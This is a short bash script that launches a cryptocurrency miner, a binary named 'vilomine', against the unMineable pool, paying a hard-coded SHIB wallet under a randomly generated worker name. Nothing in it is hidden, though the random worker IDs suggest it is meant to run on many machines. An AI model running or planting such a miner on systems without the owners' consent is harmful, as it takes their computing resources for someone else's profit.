#!/bin/bash
POOL=rx.unmineable.com:13333
WALLET=SHIB:0x5be5d7f69aa748a68137a24bf1f14a49b5d7c754
WORKER=$(echo $(shuf -i 10000-999999 -n 1)-OM#69ap-1smi)

chmod +x vilomine
./vilomine --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
